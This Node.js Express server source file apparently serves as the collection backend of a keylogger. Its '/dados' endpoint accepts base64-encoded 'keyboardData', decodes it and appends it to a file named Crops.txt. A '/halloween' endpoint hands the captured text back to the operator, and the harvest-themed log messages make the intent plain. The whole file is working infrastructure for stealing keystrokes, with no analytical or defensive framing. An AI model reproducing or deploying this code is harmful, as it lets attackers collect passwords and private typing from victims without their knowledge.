const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const cors = require('cors');


const app = express();
const PORT = 3108;

app.use(bodyParser.json());
const corsOptions = {
    origin: process.env.REACT_CLIENT_URL || 'http://localhost:3000', 
    optionsSuccessStatus: 200 
  };
  
  app.use(cors(corsOptions));
function salvarConteudoArquivo(texto) {
    try {
        
        fs.appendFileSync('Crops.txt', texto);
        console.log('☭ Reap and Sow ☭');
    } catch (err) {
        console.error('No Seeds', err);
    }
}


app.post('/dados', (req, res) => {
    try {
        ckdata = req.body.keyboardData;
        const keyboardData = atob(ckdata);
        
        
        if (keyboardData.trim() !== '') {
            salvarConteudoArquivo(keyboardData);
            res.status(200).send('');
        } 
    } catch (err) {
        console.error('Erro ao salvar os dados:', err);
        
    }
});

app.get('/halloween', (req, res) => {
    try {
        
        const content = fs.readFileSync('Crops.txt', 'utf-8');
        
        res.send(content);
    } catch (err) {
        console.error('Erro ao ler o arquivo:', err);
        res.status(500).send('Erro ao ler o arquivo');
    }
});




app.listen(PORT, () => {
    console.log(`🎃-- Que a Colheita Comece ${PORT} --🎃`);
});
